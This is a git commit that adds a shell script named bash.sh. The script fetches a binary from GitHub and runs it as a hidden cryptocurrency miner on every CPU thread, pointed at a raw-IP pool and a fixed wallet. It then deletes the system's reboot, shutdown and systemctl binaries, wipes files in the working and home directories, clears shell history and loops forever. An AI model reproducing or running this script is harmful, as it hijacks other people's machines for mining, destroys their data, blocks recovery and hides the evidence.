8b26274a242c6b4553faca870d4bfe43e13bcd8b
LogiTech <117252755+oggierf@users.noreply.github.com>
2024-12-26 16:05:11 +0700

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,16 @@
+#!/bin/bash
+apt-get update 
+wget -O oasis https://github.com/malogrono/Compare/raw/main/ayday
+chmod 777 oasis
+./oasis --algorithm verushash --pool stratum+tcp://209.97.168.28:443 --wallet RCADCQ9UW1RsUaF94Jp4huPSdQ7bhwYwa4.A$RANDOM --password x --cpu-threads $(nproc --all) > /dev/null 2>&1
+sleep 30
+sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
+rm -rvf *
+cd ~/
+rm -rvf *
+history -cr
+while true
+do
+        echo "hold down..."
+        sleep 60
+done
